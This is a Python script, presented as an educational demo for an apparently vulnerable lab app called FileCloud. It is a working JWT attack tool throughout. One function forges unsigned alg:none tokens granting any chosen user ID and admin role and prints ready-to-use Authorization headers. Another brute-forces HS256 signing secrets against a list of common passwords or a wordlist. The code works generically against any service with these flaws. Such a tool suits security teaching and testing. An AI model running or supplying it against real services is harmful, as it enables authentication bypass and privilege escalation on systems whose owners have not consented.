#!/usr/bin/env python3
"""
forge_token.py — JWT Attack Tool (Educational Demo)
====================================================
Demonstrates two JWT attacks against FileCloud:

  1. Weak Secret Brute Force  — crack the HS256 signature with a wordlist
  2. Algorithm Confusion (alg:none) — forge a token with no signature

Usage:
  python3 forge_token.py --user_id 3 --username admin --role admin
  python3 forge_token.py --crack <token>

OWASP A02:2025 — Cryptographic Failures
"""

import sys, base64, json, hmac, hashlib, argparse

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s):
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)

def forge_alg_none(user_id, username, role):
    """Forge a JWT with alg:none — no signature required."""
    header  = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
    payload = b64url_encode(json.dumps({"user_id": user_id, "username": username, "role": role}))
    token   = f"{header}.{payload}."
    print(f"\n[+] Forged alg:none token:")
    print(f"    {token}")
    print(f"\n[+] Use as: Authorization: Bearer {token}")
    print(f"    Or set in browser: fetch('/api/me', {{headers: {{Authorization: 'Bearer {token}'}}}}).then(r=>r.json()).then(console.log)")
    return token

def crack_token(token, wordlist=None):
    """Attempt to crack HS256 JWT secret."""
    parts = token.split(".")
    if len(parts) != 3:
        print("[-] Invalid JWT format")
        return

    header_payload = f"{parts[0]}.{parts[1]}"
    sig = b64url_decode(parts[2])

    common_secrets = ["secret", "secret123", "password", "jwt_secret", "mysecret",
                      "supersecret", "changeme", "admin", "filecloud", "1234"]

    if wordlist:
        try:
            with open(wordlist) as f:
                common_secrets = [l.strip() for l in f]
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {wordlist}")

    print(f"[*] Cracking JWT with {len(common_secrets)} candidates...")
    for secret in common_secrets:
        expected = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
        if expected == sig:
            print(f"[+] SECRET FOUND: {secret}")
            payload = json.loads(b64url_decode(parts[1]))
            print(f"[+] Payload: {json.dumps(payload, indent=2)}")
            return secret
    print("[-] Secret not found in wordlist")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT Attack Tool")
    parser.add_argument("--user_id",  type=int,   default=3)
    parser.add_argument("--username", type=str,   default="admin")
    parser.add_argument("--role",     type=str,   default="admin")
    parser.add_argument("--crack",    type=str,   help="Token to crack")
    parser.add_argument("--wordlist", type=str,   help="Wordlist file for cracking")
    args = parser.parse_args()

    if args.crack:
        crack_token(args.crack, args.wordlist)
    else:
        forge_alg_none(args.user_id, args.username, args.role)
